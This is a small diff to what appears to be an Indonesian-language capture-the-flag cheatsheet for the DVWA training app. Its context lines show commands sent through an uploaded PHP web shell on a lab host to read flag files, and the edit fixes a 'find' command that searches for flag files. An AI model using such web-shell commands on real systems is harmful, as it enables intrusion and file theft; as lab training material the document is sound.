@@ -54,9 +54,9 @@ http://10.13.0.5/dvwa/hackable/uploads/shell.php?cmd=type C:\flag.txt
 http://10.13.0.5/dvwa/hackable/uploads/shell.php?cmd=cat /flag.txt
 ```
 ### cheatseet
-Cari flag Linux	find 
+Cari flag Linux	
 ```
-/ -name "flag*" 2>/dev/null
+find / -name "flag*" 2>/dev/null
 ```
 Cari flag Windows	
 ```
